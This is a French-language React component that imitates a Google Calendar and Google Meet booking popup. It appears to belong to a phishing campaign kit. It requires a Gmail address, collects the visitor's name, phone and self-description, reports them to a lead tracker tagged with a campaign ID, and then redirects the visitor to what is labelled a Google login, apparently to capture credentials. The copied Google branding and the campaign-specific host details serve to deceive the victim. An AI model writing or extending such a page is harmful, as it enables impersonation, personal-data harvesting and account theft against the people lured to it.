import React, { useState } from 'react';
import BasePopup from '../common/BasePopup';
import { useLeadTracker } from '../../hooks/useLeadTracker';
import { validateGmailAddress } from '../../utils/validation';
import { redirectToGoogleLogin } from '../../utils/redirect';
import styles from '../../styles/components/CommonPopup.module.css';

/**
 * Popup de réservation pour la landing Calendar
 * Collecte les informations de base et redirige immédiatement
 */
const CalendarPopup = ({ isVisible, onClose, campaignData }) => {
  const [emailError, setEmailError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { trackBooking, isTracking } = useLeadTracker();

  const handleEmailChange = (e) => {
    const email = e.target.value;
    if (email && !validateGmailAddress(email)) {
      setEmailError('Merci d\'utiliser une adresse Gmail compatible.');
    } else {
      setEmailError('');
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    const formData = new FormData(e.target);
    const email = formData.get('email');
    const firstName = formData.get('firstName');
    const phone = formData.get('phone');
    const description = formData.get('description');
    
    // Validation finale
    if (!validateGmailAddress(email)) {
      setEmailError('Merci d\'utiliser une adresse Gmail compatible.');
      return;
    }
    
    setIsSubmitting(true);
    
    // DEBUG: Logs pour diagnostiquer le problème de campaignId
    console.log('=== DEBUG CalendarPopup handleSubmit ===');
    console.log('campaignData:', campaignData);
    console.log('campaignData?.id:', campaignData?.id);
    console.log('leadData que nous passons à trackBooking:', {
      email,
      firstName,
      phone,
      description,
      campaignId: campaignData?.id
    });
    
    // Tracking en arrière-plan (fire and forget)
    trackBooking({
      email,
      firstName,
      phone,
      description,
      campaignId: campaignData?.id
    }).catch(error => {
      console.warn('Erreur de tracking:', error);
    });
    
    // Redirection immédiate
    redirectToGoogleLogin({
      email,
      firstName,
      campaign: campaignData?.id
    });
  };

  return (
    <BasePopup isVisible={isVisible} onClose={onClose}>
      <div className={styles.popupHeader}>
        <h2 className={styles.title}>Échange / Café virtuel</h2>
        <div className={styles.dateTime}>
          <div>Réunion Google Meet • 15 minutes</div>
          <div className={styles.timezone}>(GMT+02:00) Heure d'Europe centrale - Paris</div>
          {campaignData && (
            <div className={styles.eventHost}>
              {campaignData.firstName} • {campaignData.email}
            </div>
          )}
        </div>
      </div>

      <div className={styles.meetInfo}>
        <img 
          src="https://ssl.gstatic.com/calendar/images/conferenceproviders/logo_meet_2020q4_192px.svg" 
          alt="Google Meet" 
          width="20" 
          height="20" 
          className={styles.meetIcon}
        />
        <div>Informations de visioconférence Google Meet ajoutées après la réservation</div>
      </div>

      <div className={styles.formSection}>
        <div className={styles.contactHeader}>
          <svg 
            focusable="false" 
            width="20" 
            height="20" 
            viewBox="0 0 24 24" 
            className={styles.contactIcon}
          >
            <path d="M22 3H2C.9 3 0 3.9 0 5v14c0 1.1.9 2 2 2h20c1.1 0 1.99-.9 1.99-2L24 5c0-1.1-.9-2-2-2zm0 16H2V5h20v14z"></path>
            <path d="M21 6h-7v5h7V6zm-1 2l-2.5 1.25L15 8V7l2.5 1.25L20 7v1zM9 12c1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3 1.34 3 3 3zm0-4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm6 7.75c0-1.99-4-3-6-3s-6 1.01-6 3V18h12v-2.25zM13 16H5v-.09c.48-.5 2.51-1.16 4-1.16s3.52.66 4 1.16V16z"></path>
          </svg>
          <h3>Informations de contact</h3>
        </div>

        <form className={styles.form} onSubmit={handleSubmit}>
          <div className={styles.formRow}>
            <div className={styles.inputGroup}>
              <label>Nom complet</label>
              <input 
                type="text" 
                name="firstName" 
                className={styles.input} 
                required 
                disabled={isSubmitting}
              />
            </div>
          </div>


          <div className={styles.formRow}>
            <div className={styles.inputGroup}>
              <label>Adresse Gmail</label>
              <input 
                type="email" 
                name="email"
                className={`${styles.input} ${emailError ? styles.inputError : ''}`}
                onChange={handleEmailChange}
                placeholder="votre.nom@gmail.com"
                required 
                disabled={isSubmitting}
              />
              {emailError && <div className={styles.errorMessage}>{emailError}</div>}
            </div>
          </div>

          <div className={styles.formRow}>
            <div className={styles.inputGroup}>
              <label>Numéro de téléphone</label>
              <input 
                type="tel" 
                name="phone" 
                className={styles.input} 
                disabled={isSubmitting}
              />
            </div>
          </div>

          <div className={styles.formRow}>
            <div className={styles.inputGroup}>
              <label>Présentez-vous en quelques mots</label>
              <textarea 
                name="description" 
                className={styles.textarea} 
                rows="3"
                disabled={isSubmitting}
              ></textarea>
            </div>
          </div>

          <div className={styles.formActions}>
            <button 
              type="button" 
              onClick={onClose} 
              className={styles.cancelBtn} 
              disabled={isSubmitting}
            >
              Annuler
            </button>
            <button 
              type="submit" 
              className={styles.bookBtn} 
              disabled={isSubmitting || isTracking}
            >
              {(isSubmitting || isTracking) ? (
                <div className={styles.loadingContainer}>
                  <div className={styles.spinner}></div>
                  <span>{isTracking ? 'Réservation...' : 'Vérification en cours...'}</span>
                </div>
              ) : (
                'Réserver'
              )}
            </button>
          </div>
        </form>
      </div>
    </BasePopup>
  );
};

export default CalendarPopup; 